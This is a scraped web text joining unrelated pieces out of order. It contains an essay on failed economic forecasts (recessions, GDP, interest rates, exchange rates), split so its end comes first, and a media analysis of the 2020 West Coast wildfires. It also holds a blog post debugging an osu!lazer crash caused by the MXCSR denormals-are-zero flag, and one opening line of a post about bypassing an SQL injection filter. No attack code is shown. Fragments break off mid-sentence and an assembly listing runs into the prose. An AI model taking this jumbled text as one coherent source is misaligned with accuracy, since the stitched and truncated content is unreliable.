range of all twenty-two bank forecasts. (…) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.”</p></blockquote><p>Gigerenzer’s own conclusion was even more clear:</p><blockquote><p>“Forecasts of dollar-to-euro exchange rates are worthless.”</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate …</p></div></div></div></div></div></div></div>

<p>This week, the fires across the West Coast highlighted our own inability to comprehend the scale of a disaster scenario, with air quality in parts of Oregon <a href="https://www.oregonlive.com/news/2020/09/portlands-air-quality-is-off-the-charts-on-sunday-and-much-of-oregon-is-just-as-bad-due-to-wildfires.html" rel="noopener" target="_blank"><span>exceeding</span></a> the Environmental Protection Agency’s 500-point AQI scale. Previously, events that put the AQI at 300 were “extremely rare”; in recent days, the AQI in places like Eugene, Oregon topped 700, essentially <a href="https://grist.org/climate/oregons-air-quality-is-so-far-beyond-hazardous-that-no-one-knows-what-it-means-for-health/" rel="noopener" target="_blank"><span>unfamiliar territory</span></a> in terms of air quality.&nbsp;</p>
<p>Though not quite the same as a nuclear meltdown, we are similarly unprepared to answer key questions about the crisis: What are the <a href="https://www.vox.com/21427857/california-wildfire-2020-oregon-washington-air-quality-smoke-orange-red-sky-health" rel="noopener" target="_blank"><span>health impacts</span></a> of exposure to this air? What are the long-term effects of fires in forest land that <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>shouldn’t typically burn</span></a>? And above all, to what degree is human activity, via climate change or other mechanisms, responsible for such natural disasters?&nbsp;</p>
<p>This week, The Factual surveyed 29 articles from 23 news sources across the political spectrum to see how the media is talking about the West Coast’s mega-fire season, including views on how and to what degree human activity is responsible for seemingly apocalyptic scenarios.</p>
<h4><br><strong>A Wild Wildfire Season</strong></h4>
<p>Given the <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>unprecedented scope</span></a> of this year’s wildfires on the West Coast, a common question is why this wildfire season has been quite so bad. A cursory glance at headlines and comments by national figures would lead one to believe that there is a simple dichotomy, with the political left blaming climate change and the right blaming bad government policies. In reality, there seems to be some broad agreement on the key factors at play: (1) a problematic approach to forest management that has led to greater fire risks, (2) human behavior that makes fires more dangerous and more likely, and (3) a warming climate. Only when measuring to what degree changing climate is responsible, and the fundamental reasons for why climate is changing, does real disagreement emerge.</p>
<p>A big misconception about fires is that they are inherently dangerous and/or bad for the environment, but the reality is that they are an <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>essential part</span></a> of ecosystem renewal and healthy environmental progression. In a natural scenario, many forest habitats should burn on a regular basis, clearing the underbrush while leaving larger trees mostly unharmed. But a longtime misdirected approach to fire management on the West Coast has prioritized <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>putting out</span></a> fires quickly to protect growing human populations. However, this strategy has not been accompanied by enough controlled burns to limit growing fire risks and maintain normal ecosystem renewal.</p>
<p><span>"Part of the difficulty is that California’s climate provides only limited periods of time when crews can safely light fires to manage forest health. The conditions must be dry enough for vegetation to burn, but not dry enough to risk a runaway blaze." - <a href="https://www.sfchronicle.com/california-wildfires/article/Are-climate-change-or-poor-forest-management-15564031.php" rel="noopener" target="_blank">San Francisco Chronicle</a></span></p>
<p>While the safety rationale of the choice not to burn seems straightforward, it can perversely have the opposite effect. If an ecosystem does not burn, the underbrush continues to build up, making the next eventual fire <a href="https://www.nationalreview.com/2020/09/california-forest-mismanagement-a-disaster/#slide-1" rel="noopener" target="_blank"><span>hotter and more dangerous</span></a>. As the fire intensity increases, trees that shouldn’t burn go up in flames and smaller, low-intensity fires become fast-moving disasters that endanger natural ecosystems and human settlements alike. In this way, man-made policies have helped make the West Coast a tinderbox.</p>
<div><p>Further aggravating this risk is human behavior. As populations and urban areas grow, humans have expanded ever-outward, encroaching on and living in heavily-forested areas. This has increasingly placed populations in danger from wildfires. Forest management has been consistently <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>under-resourced</span></a>, and landowners aren't always <a href="https://arstechnica.com/science/2020/01/why-isnt-california-using-more-prescribed-burns-to-reduce-fire-risk/" rel="noopener" target="_blank"><span>willing</span></a> to respond with the measures needed to mitigate fire risks. In California, for example, the state only owns <a href="https://www.kqed.org/science/1927354/controlled-burns-can-help-solve-californias-fire-problem-so-why-arent-there-more-of-them" rel="noopener" target="_blank">57% of forested land</a> and cannot obligate private landowners to use controlled burns to mitigate fire risks.</p></div>

<div><p>The WUI, or wildland-urban interface, is the area where human settlement and wildlands intermix. These are areas were human structures are in close proximity to land prone to wildfires. Source: <a href="https://www.nrs.fs.fed.us/news/release/wui-increase" rel="noopener" target="_blank"><span>USDA</span></a></p></div>
<p>Factors such as lower housing costs and a desire to be closer to nature have <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>helped encourage</span></a> the development subdivisions and individual homes well into the forest. To make matters worse, as these populations (and people from across the states) spend more time outdoors and in these forests, the risk of fire goes up. The ever-increasing levels of human activity is accompanied by an ever-higher risk of fire.</p>
<div><p>Finally, the overall climatic conditions cannot be ignored. 2020 promises to be one of the <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>hottest years on record</span></a>, and this year’s fire season vigorously kicked off on a record-hot Labor Day weekend, partly because of a freak lightning storm in California (with over <a href="https://abcnews.go.com/ABCNews/million-acres-burned-california-firefighters-brace-lightning-storm/story?id=72551511" rel="noopener" target="_blank"><span>12,000 lightning strikes</span></a>) and partly because landscapes across the West Coast were uncharacteristically dry — even for fire season.&nbsp;</p></div>

<p>It would seem that disputes about whether the world is warming have been replaced with a general agreement that, yes, things are getting hotter. This has obvious, straightforward effects for natural events like wildfires. Higher temperatures mean drier vegetation and potentially even more high-intensity <a href="https://www.oregonlive.com/news/2020/09/oregons-historic-wildfires-the-unprecedented-was-predictable.html" rel="noopener" target="_blank"><span>wind events</span></a>. That this is at least part of the reason for this fire season’s severity is clear to people on both sides of the spectrum.</p>
<p>Where these perspectives diverge is in terms of just who or what is responsible for changing climate. Though President Trump has used the occasion to <a href="https://www.washingtonexaminer.com/policy/energy/trump-says-world-will-start-getting-cooler-as-biden-criticizes-him-as-a-climate-arsonist" rel="noopener" target="_blank"><span>cast doubt</span></a> on the question of whether climate is changing — something almost all of the articles reviewed for this analysis roundly agree to be the case — the more pertinent divergence regards the degree to which human activity is responsible for the changing climate.&nbsp;</p>
<p>Articles from the political left and center are clear in the science and rationale for linking human activity, particularly the release of greenhouse gas emissions, with climate change — a phenomenon that represents a combination of not just overall warmer temperatures but also increasing weather extremes, rising sea levels, and shifting climatic patterns. In the case of wildfires, this means some articles lay proportionally more blame on <a href="https://www.latimes.com/california/story/2020-09-13/climate-change-wildfires-california-west-coast" rel="noopener" target="_blank"><span>larger climate trends</span></a>, blaming global <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>CO2 emissions</span></a> as much as localized factors like forestry management.&nbsp;</p>
<p>“Many of the phenomena happening now have been predicted for years by agencies like NASA, NOAA and the United Nations, as well as researchers and scientists around the world, who say the only chance of slowing climate change is cutting back or eliminating the biggest producers of greenhouse gases, including cars.” - <a href="https://weather.com/news/climate/news/2020-09-11-extreme-weather-climate-change-disasters-wildfires-flooding-hurricanes" rel="noopener" target="_blank"><span>The Weather Channel</span></a></p>
<p>Many on the political right are still hesitant to conclude that human activity is the driving force behind a changing climate, even if many acknowledge that the climate is <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>getting warmer</span></a>. As a result, much more right-leaning coverage focuses on the direct, <a href="https://reason.com/2020/09/14/western-wildfires-can-be-prevented-if-burdens-on-forest-management-are-eased/" rel="noopener" target="_blank"><span>human reasons</span></a> for the current spate of fire disasters, and <a href="https://today.yougov.com/topics/science/articles-reports/2020/09/15/what-americans-think-about-wildfires-and-climate-c" rel="noopener" target="_blank"><span>roughly half</span></a> of Republicans may think that climate change has not played a role in the current fires.&nbsp;</p>
<p>Ideally, we could better isolate each variable to say how much human movement into forests is responsible for fires and how much is due to a warmer climate, but this is hard to parse from overall trends. For example, across the U.S. we built as many as <a href="https://www.mdpi.com/2571-6255/3/3/50/htm" rel="noopener" target="_blank"><span>32 million homes</span></a> between 1990 and 2015 in the wildland-urban interface — areas where the wildlands intermix with human development — many of which are at increased fire risk. At the same time, fires near Portland are burning forest that has historically been too wet to pose a significant hazard to long-standing neighborhoods.&nbsp;</p>
<p>“What’s different this time is that exceptionally dry conditions, combined with unusually strong and hot east winds, have caused wildfires to spiral out of control, threatening neighborhoods that didn’t seem vulnerable until now.” - <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>New York Times</span></a></p>
<div><p>A positive perspective on the issue might note that both sides, despite clear and vocal differences, actually agree that human activity and behavior make up many of the key reasons for these apocalyptic conditions.</p></div>
<h4><strong>Moving Forward</strong></h4>
<p>As <a href="https://www.chicagotribune.com/weather/ct-weather-smoke-fires-gray-sky-20200914-kpmxe2i2gjhahocfpd7zwovqt4-story.html" rel="noopener" target="_blank"><span>smoke wafts</span></a> across the U.S., there may be greater impetus to drive higher-level reform to address these growing issues. There are many reforms that both sides can agree on. Above all, we need to <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>modify land management practices</span></a> and divert more resources to both fire response and prevention. For example, as the risk of fire has increased, funding that should be used for fire prevention has been shifted to firefighting. Cumbersome regulatory hurdles have slowed the implementation of controlled burns, and private landowners <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>can still reject</span></a> such preventative action, often fearful of <a href="http://sacbee.com/news/california/article239475468.html" rel="noopener" target="_blank"><span>liability</span></a>. Measures like <a href="https://slate.com/business/2018/11/california-houses-rebuild-camp-fire-design.html" rel="noopener" target="_blank"><span>increasingly fire-proof</span></a> homes can help, but only go so far.</p>
<p>“Forest Service spending on fire suppression in recent years has gone from 15 percent of the budget to 55 percent – or maybe even more – which means we have to keep borrowing from funds that are intended for forest management.” - <a href="https://www.usda.gov/media/press-releases/2017/09/14/forest-service-wildland-fire-suppression-costs-exceed-2-billion" rel="noopener" target="_blank"><span>Secretary of Agriculture Sonny Purdue</span></a></p>
<p>Below this common ground, larger disagreements promise to persist, especially about climate change and its role in the current conflagrations. A host of policy actions that the political left targets, such as reducing …</p></span></p></div></div></div></div></div></div></div></div></div></div></div>

In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte’s site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies’ websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn’t stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you’ll find forecasts stretching all the way to the year 2100. We’re still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let’s take a moment to look at the predictions of the past.&nbsp;Let’s see how our projections panned out.</p><h3>We can’t predict recessions</h3><p>The Economist’s “The World in 2020”, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue’s predictions on 2020’s economic outlook:&nbsp;</p><blockquote><p>“Banks, especially in Europe, will battle with negative interest rates. America will flirt with recession—but don’t be surprised if disaster fails to strike, and markets revive.”</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn’t to know that we were on the precipice of a pandemic.&nbsp;So let’s review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;“In the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: “The record of failure to predict recessions is virtually unblemished.””</p></blockquote><p>It’s hard to overstate the severity of Loungani’s findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund’s predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden’s success rate of 0.85% is remarkably consistent with Longani’s.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>“Since 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.”</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It’s clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn’t stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>“Even with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (…) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.”</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn’t sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>“(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany’s economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.”</p></blockquote><p>But it isn’t just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you’d expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn’t stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>“The level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government’s budget.”</p></blockquote><p>With interest rates being so important to so many, it’s no surprise that an entire industry of professional predictors exists to monitor the rate’s past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions’ lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That’s like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn’t a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>“The decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.”</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn’t stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>“In six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts.

        <p>Most of the time debugging isn’t really much to write about, especially in C# land.
In a language executing on a VM, with a managed memory model, most bugs are relatively shallow and easy to fix, except for the occasional race if you’re doing multi-threading - so when suddenly it appears that comparison of doubles has stopped working correctly, all bets are off.</p>

<p>About the only options available at that point that don’t result in loss of sanity are:</p>

<ol>
  <li>give up investigating and accept that computers are fickle, unknowable machines, uncontrollable by your puny meat-based mind,</li>
  <li>spend a week of evenings looking at why the program you’re looking at apparently entirely fails at arithmetic.</li>
</ol>

<p>From the fact that this post exists, you’ve probably guessed that I went for #2.</p>



<p>It all started with <a href="https://github.com/ppy/osu/issues/9952">yet another GitHub issue</a>, in which a user reported a crash after clicking around in the <a href="https://github.com/ppy/osu">osu!lazer</a> beatmap editor.
(I won’t go into the particular details of what a beatmap editor is, as it’s mostly unimportant to the larger topic of this post.)</p>

<p>As is usual operating procedure, I, along with others, went to try to reproduce the problem on my Ubuntu install, and failed; it looked like it was going to be yet another irreproducible, and therefore inactionable, crash report.</p>

<p>The first “hail mary” came from the reporter themselves - they managed to ascertain that the crash only happened when the game was ran in single-threaded mode, and in a joint effort we’ve also managed to ascertain that it was also Windows-specific.
This already bore the signs that it was going to be an <em>interesting</em> one to deal with - especially given where the crash was located at…</p>

<p>Without going through too much unnecessary detail, the bespoke framework that osu!lazer uses has the concept of <em>bindables</em>.
A bindable is a wrapper around a value; a bindable can be, as the name suggests, <em>bound</em> to another bindable, and therefore bidirectionally receive and send value updates to and from the other bindable.
This allows showing one particular value in multiple places on the UI, and ensuring that if one instance changes, the others will follow suit.</p>

<p>For numerical bindables, backed by floating-point values, the bindables have a built-in notion of precision, to prevent changes on the order of 1e-10 firing all sorts of callbacks when they don’t really matter.
Here’s the implementation of the <code>Precision</code> property:</p>

<div><div><pre><code><span>public</span> <span>T</span> <span>Precision</span>
<span>{</span>
    <span>get</span> <span>=&gt;</span> <span>precision</span><span>;</span>
    <span>set</span>
    <span>{</span>
        <span>if</span> <span>(</span><span>precision</span><span>.</span><span>Equals</span><span>(</span><span>value</span><span>))</span>
            <span>return</span><span>;</span>

        <span>if</span> <span>(</span><span>value</span><span>.</span><span>CompareTo</span><span>(</span><span>default</span><span>)</span> <span>&lt;=</span> <span>0</span><span>)</span>
            <span>throw</span> <span>new</span> <span>ArgumentOutOfRangeException</span><span>(</span><span>nameof</span><span>(</span><span>Precision</span><span>),</span> <span>value</span><span>,</span> <span>"Must be greater than 0."</span><span>);</span>

        <span>SetPrecision</span><span>(</span><span>value</span><span>,</span> <span>true</span><span>,</span> <span>this</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>For some reason, on Windows, in single-threaded mode, setting <code>Precision</code> to <code>double.Epsilon</code> caused the <code>ArgumentOutOfRangeException</code> to be thrown, even though <code>double.Epsilon</code> is <em>definitively</em> larger than zero.
Debugger or no debugger, you could <em>see</em> <code>value</code> having <code>5e-324</code> in a watch and <code>default</code> being <code>0</code>, and then the branch with the throw would be taken <em>anyway</em>, almost as if the fabric of reality was slipping from right under your feet.</p>

<p>It was clearly time to leave my beloved Rider, open up the rusty (but trusty) Visual Studio and get out the disassembly window.
After having enabled native debugging in the project settings and stepping into <code>double.CompareTo()</code>, I saw the following assembly code:</p>

<div><div><pre><code>--- /_/src/System.Private.CoreLib/shared/System/Double.cs ----------------------
            if (m_value &lt; value) return -1;
00007FFA1F5307E0  sub         rsp,18h

<p>And, sure enough, I could definitely see that the execution of these instructions differed beteween multi-threaded and single-threaded mode.
Using the “Registers” window I dumped the register state in both cases and got the following result (click screenshot below to enlarge):</p>

<p><a href="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" target="_blank"><img src="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" alt=""></a></p>

<p><code>xmm0</code> and <code>xmm1</code> clearly have sane and expected values in both cases, so it definitely wasn’t a mis-store.
It was the comparison <em>itself</em> that was somehow wrong - but why?</p>

<p>I quickly (and, in retrospect, stupidly) went to confirm that the issue was CPU vendor-agnostic, and got the confirmation that it happens on both Intel and AMD CPUs.
About the only meaningful discrepancy seemed to be the mystery <code>MXCSR</code> value, so it was time to investigate.</p>



<p>Before having departed on this journey, I have never really cared to look up anything about SSE/AVX registers.
Any readers that possess such knowledge have already spotted the problem in the screenshot above, but for those that presumably have never looked into anything of the sort, this section aims to be a brief recap.</p>

<p>The <code>vucomisd</code> instruction is a - watch out - <em>vectorised unordered compare of scalar double-precision floating point values</em> that happens to return its result in <code>EFLAGS</code>.
Let’s break this down further into constituent parts:</p>

<ul>
  <li>The <em>vectorised</em> part means SIMD (<em>single instruction, multiple data</em>).
SIMD instructions allow <em>data parallelisation</em> - on a concrete example, you can execute one common instruction simultaneously on <code>N</code> different values at a time.
Thankfully in this case that part isn’t really all that relevant.</li>
  <li>The <em>unordered</em> part relates to <code>NaN</code>s.
In IEEE 754 floating-point math, <code>NaN</code>s are special (and annoying) values that fail every comparison they’re part of (so a <code>NaN</code> is neither less, greater than or equal to any other number, including another <code>NaN</code>).</li>
  <li><em>Compare of scalar double-precision floating point values</em> sounds about right for what we wanted in the C# code to begin with.</li>
</ul>

<p>The result is returned in <code>EFLAGS</code>, which is a special quasi-register that is better viewed as a set of flags.
Here is the table describing the possible results of a <code>vucomisd</code> instruction:</p>

<table>
  <thead>
    <tr>
      <th>result</th>
      <th>zero flag (ZF)</th>
      <th>parity flag (PF)</th>
      <th>carry flag (CF)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>unordered (one of operands is a <code>NaN</code>)</td>
      <td>1</td>
      <td>1</td>
      <td>1</td>
    </tr>
    <tr>
      <td>greater than</td>
      <td>0</td>
      <td>0</td>
      <td>0</td>
    </tr>
    <tr>
      <td>less than</td>
      <td>0</td>
      <td>0</td>
      <td>1</td>
    </tr>
    <tr>
      <td>equal</td>
      <td>1</td>
      <td>0</td>
      <td>0</td>
    </tr>
  </tbody>
</table>

<p>Now, the <code>MXCSR</code> register is a special <em>control register</em>, in that it <em>controls</em> how the other SSE/AVX instructions execute.
In this particular case we’re interested in two related flags, one of which will turn out to be causing the madness.</p>

<ul>
  <li>Bit 15 of the register is <em>Flush To Zero (FTZ)</em>. Setting that bit will cause <em>writes</em> of denormal floating-point values to be coerced to zero.</li>
  <li>Bit 6 of the register is <em>Denormals Are Zero (DAZ)</em>. Setting that bit will cause <em>reads</em> of denormal floating-point values to be coerced to zero.</li>
</ul>

<p>This is immediately eye-catching in this particular scenario, as coercion to zero would definitively explain the differing equality result.
However, to confirm, let’s define what a <em>denormal value</em> is (because I didn’t know either).</p>

<p>A denormal value is a floating-point value that has leading zeroes in the significand (so it’s of the form 0.00…1…).
This can only happen if the exponent of the value is all zeroes - in that case, the implicit leading 1, normally assumed for any other exponent, is swapped for a zero.
Therefore, the largest denormal double-precision value is</p>

<div><div><pre><code>0b0 0000000000 1111111111111111111111111111111111111111111111111111 = 2.225073858507201e-308
  ± |exponent| |--------------mantissa/significand----------------|
</code></pre></div></div>

<p>Because <code>double.Epsilon</code> is essentially a <code>(uint64_t)0x1</code>, it definitely <em>is</em> a denormal number.
And, sure enough, as the screenshot above demonstrates, DAZ is <em>set</em> in the single-threaded case, in which the issue reproduces.</p>

<p>Incidentally, <code>MXCSR</code> (at least on Windows) is part of the thread context, which explains why the multi-threaded mode worked fine - it’s incredibly likely that the change also occurs in multi-threaded mode, but doesn’t affect other threads, including the one that does the bogus comparison, therefore effectively “hiding” the issue.</p>

<p>That answers the immediate question of what’s going wrong, but now there’s a <em>huge</em> problem - anyone could be writing a value to a register at any time, so <em>who is</em>?</p>



<p>This is <em>about</em> the point where I started freaking out.
The obvious first step for a programmer during a freak-out is to start frantically googling around for <em>something</em> that can be related, and so I made my way over to <a href="https://github.com/dotnet/runtime"><code>dotnet/runtime</code></a> and started typing in vaguely related terms.</p>

<p>Surprise, it wasn’t an issue in the runtime itself, but I <em>did</em> find a few important clues:</p>

<ul>
  <li>
    <p>First, I <a href="https://github.com/dotnet/runtime/blob/96f178d32b7ba62485917ac46ef1edcfd3c2d10d/src/coreclr/src/vm/cgensys.h#L157-L171">found calls</a> to the <code>_mm_setcsr()</code> x64 intrinsic, which set the value of <code>MXCSR</code>:</p>

    <div><div><pre><code>  <span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>m_mxcsr</span> <span>=</span> <span>_mm_getcsr</span><span>();</span>
      <span>_mm_setcsr</span><span>(</span><span>0x1f80</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>

  <span>~</span><span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>_mm_setcsr</span><span>(</span><span>m_mxcsr</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>
</code></pre></div>    </div>

    <p>This clearly shows that the runtime is aware of what a <code>MXCSR</code> is and it <em>does</em> try to restore the sane value of <code>0x1F80</code>, <em>sometimes</em>.
I didn’t follow up on when, because I figured it was <em>very</em> unlikely Microsoft engineers would overlook something of this magnitude, and it was probably something that we were doing, directly or indirectly.</p>
  </li>
  <li>
    <p>Secondly, I spotted <a href="https://github.com/dotnet/runtime/blob/56797842d45a0f55345842ab166618d0c153ec3c/src/coreclr/src/jit/utils.cpp#L2086-L2087">this comment</a>:</p>

    <div><div><pre><code><span>// Return Value:</span>
<span>//    True if 'x' is a power of two value and is not denormal (denormals may not be well-defined</span>
<span>//    on some platforms such as if the user modified the floating-point environment via a P/Invoke)</span>
</code></pre></div>    </div>

    <p>This rang several alarm bells immediately.
As a cross-platform .NET Core game with a bespoke framework, lazer has to make a <em>lot</em> of P/Invokes and native calling to <em>be</em> a game.
Combined with the fact that denormals/flush to zero are usually set by programs that …</p></li></ul></div></article></div></div></div>

        <!-- <h1 class="post-title">How I bypassed Cloudflare's SQL Injection filter</h1> -->

        <section>
            <p>In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
